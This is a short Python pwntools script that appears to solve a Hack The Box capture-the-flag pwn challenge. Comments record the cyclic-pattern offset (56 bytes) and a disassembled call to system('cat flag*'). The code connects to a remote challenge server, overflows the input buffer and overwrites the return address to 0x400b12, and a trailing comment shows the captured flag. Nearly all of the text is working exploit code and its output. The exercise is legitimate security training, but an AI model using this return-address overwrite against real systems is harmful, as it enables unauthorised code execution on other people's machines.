from pwn import *
'''
cyclic 1024
$rbp   : 0x6161616e6161616d ("maaanaaa"?)
cyclic -l naaa
52
52+4 = 56

        00400b12 48  8d  3d       LEA        RDI ,[s_cat_flag*_004015be ]                     = "cat flag*"
                 a5  0a  00
                 00
        00400b19 e8  e2  fb       CALL       <EXTERNAL>::system                               int system(char * __command)
                 ff  ff

payload address: p64(0x100b12)
'''

#io = process('./sp_going_deeper')
ip, port = "138.68.182.130", 30346
io = remote(ip, port)

io.recvuntil('>> ')
io.sendline('1')
io.recvuntil('[*] Input: ')

payload = 'A'*(56) + p64(0x400b12)
#payload = 'A'*(56) + p64(0x400afa)
io.sendline(payload)
print io.recvall()

'''
[-] Authentication failed!

[!] For security reasons, you are logged out..

HTB{d1g_1n51d3..u_Cry_cry_cry}

[!] For security reasons, you are logged out..

'''
